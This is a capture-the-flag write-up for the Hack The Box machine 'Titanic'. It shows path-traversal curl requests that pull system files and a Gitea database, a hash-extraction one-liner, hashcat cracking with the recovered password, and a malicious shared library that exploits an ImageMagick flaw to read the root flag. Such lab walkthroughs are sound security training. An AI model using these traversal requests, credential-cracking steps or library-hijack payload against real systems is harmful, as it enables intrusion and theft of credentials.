![image](https://github.com/user-attachments/assets/70fa2487-af5a-4dfc-8b58-16aa5cbe7ec9)# Titanic Write-up

<img src="https://labs.hackthebox.com/storage/avatars/eb5942ec56dd9b6feb06dcf8af8aefc6.png" width="200" height="200">

## Recon

### Nmap

`nmap -sC -sV 10.10.11.55`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
    |_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
    80/tcp open  http    Apache httpd 2.4.52
    |_http-title: Did not follow redirect to http://titanic.htb/
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add host to `/etc/hosts`.

    echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts

## Exploitation

Titanic.htb main page:

![image](https://github.com/user-attachments/assets/71b40b1e-ff64-4f32-856d-54d159f23f17)

Book Your trip button

![image](https://github.com/user-attachments/assets/c4724f5d-2e45-43bd-aa4c-952e75998a42)

JSON file

![image](https://github.com/user-attachments/assets/2c105d92-c095-4a81-ae7a-f8fa08526f2e)

Request

![image](https://github.com/user-attachments/assets/c06f2384-b385-4148-a83f-e138ee65b364)

`/etc/passwd`

![image](https://github.com/user-attachments/assets/734d26d3-21bb-4858-a1fb-457834fd781f)

`/home/developer:/bin/bash`

![image](https://github.com/user-attachments/assets/003d0b52-b483-4573-a66f-85388ff02034)


Get the user flag!

![image](https://github.com/user-attachments/assets/09c488a2-b053-4995-9238-e1645627e117)

### Privilege escalation

Read `/etc/hosts`

![image](https://github.com/user-attachments/assets/2c5d511c-ba55-4c23-88e9-dbe511d1827c)

![image](https://github.com/user-attachments/assets/1cfb7600-e9eb-4e33-b328-486f4aaf510a)

Add `dev` subdomain to /etc/hosts on our machine!

    echo "10.10.11.55 dev.titanic.htb" | sudo tee -a /etc/hosts

dev.titanic.htb page

![image](https://github.com/user-attachments/assets/dcc13324-0065-4100-a93e-bf6aa610ecaf)

![image](https://github.com/user-attachments/assets/1172ba9c-2c0a-4ddf-b862-59a55bff68a2)

![image](https://github.com/user-attachments/assets/16f2df5c-2c1d-4d1d-b43a-b7a5f75fcc00)

![image](https://github.com/user-attachments/assets/ce09544c-a113-4fa2-aeac-8ae117163f06)

    curl --path-as-is 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini'

![image](https://github.com/user-attachments/assets/5266dcb4-847a-4764-9000-5e95937617a1)

     /download?ticket=/home/developer/gitea/data/gitea/gitea.db

![image](https://github.com/user-attachments/assets/bc683fe5-e5e5-4f29-b383-8b0115d1bf71)

    curl --path-as-is 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' --output database

![image](https://github.com/user-attachments/assets/06bd7efb-ce02-4a1e-875f-2c7263d42e50)

sqlitebrowser

![image](https://github.com/user-attachments/assets/cc4e3c59-08f5-4824-bcef-0229057b30b3)

    sqlite3 database.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes

![image](https://github.com/user-attachments/assets/a9e252e0-c0e2-4c04-80f9-47c651ef21a0)

`administrator`:`sha256`:`50000`:`LRSeX70bIM8x2z48aij8mw==`:`y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=`

`developer`:`sha256`:`50000`:`i/PjRSt4VE+L7pQA1pNtNA==`:`5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=`

Hashcat

`hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user`
    
    Session..........: hashcat
    Status...........: Running
    Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
    Hash.Target......: gitea.hashes
    Time.Started.....: Sat Feb 22 11:19:03 2025 (21 secs)
    Time.Estimated...: Sun Feb 23 14:01:35 2025 (1 day, 2 hours)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:      298 H/s (2.90ms) @ Accel:256 Loops:32 Thr:1 Vec:8
    Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
    Progress.........: 6144/28688770 (0.02%)
    Rejected.........: 0/6144 (0.00%)
    Restore.Point....: 3072/14344385 (0.02%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:544-576
    Candidate.Engine.: Device Generator
    Candidates.#1....: adriano -> class08
    Hardware.Mon.#1..: Util: 79%
    
    sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528

SSH

`developer`:`25282528`

    ssh developer@titanic.htb

![image](https://github.com/user-attachments/assets/1c3f49e2-70b4-425a-8ccb-2ae58a39f6f8)

    find / -writable -type d 2>/dev/null

![image](https://github.com/user-attachments/assets/dc09cd23-fdbb-466a-9694-df5aec98e8ea)

![image](https://github.com/user-attachments/assets/fd13e376-4dc5-442b-935d-c17914022cd1)

![image](https://github.com/user-attachments/assets/bb69e97d-3805-4096-9082-583574a2bdfa)

CVE-2024-41817

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

![image](https://github.com/user-attachments/assets/3a07cc08-a5e8-4e5e-9129-41fabf153378)

/opt/app/static/assets/images/

exploit 

    gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    __attribute__((constructor)) void init(){
        system("cp /root/root.txt root.txt; chmod 754 root.txt");
        exit(0);
    }
    EOF

Get the root flag!

![image](https://github.com/user-attachments/assets/dfb2ea6f-058d-4184-83d8-4aa951fbcc00)
